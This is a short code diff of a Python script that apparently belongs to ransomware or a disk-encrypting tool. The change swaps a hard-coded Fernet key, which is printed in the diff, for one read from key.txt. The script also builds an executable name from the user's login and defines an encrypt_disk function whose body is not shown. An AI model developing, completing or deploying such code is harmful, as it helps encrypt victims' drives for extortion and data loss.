@@ -5,12 +5,14 @@ from cryptography.fernet import Fernet
 import time 
 import os 
 
+key = open('key.txt', 'r')
+key = key.read()
 user = os.getlogin()
 hostname = os.getenv("COMPUTERNAME")
 
 app = f"{user}.exe"
 
-cipher_suite = Fernet(b'ZVEQ3p53kJuXn2EN-ZyJduwRuBtoYzwTQ8NOjxiCTaY=')
+cipher_suite = Fernet(key.encode())
 
 def encrypt_disk(DriveLetter):
 
